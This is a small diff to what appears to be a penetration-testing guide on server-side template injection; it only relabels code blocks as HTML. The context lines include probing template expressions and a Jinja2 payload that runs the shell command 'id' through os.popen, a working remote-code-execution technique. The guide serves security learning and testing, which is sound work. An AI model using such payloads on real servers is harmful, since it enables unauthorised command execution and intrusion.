@@ -156,7 +156,7 @@ Study engine-specific documentation or resources like **HackTricks** to identify
 
 Attempt to access key objects:
 
-```
+```html
 {{ self }}
 {{ request }}
 {{ session }}
@@ -178,7 +178,7 @@ Once internal objects are accessible, escalate to RCE or file access.
 
 **Example (Jinja2):**
 
-```
+```html
 {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
 ```
 
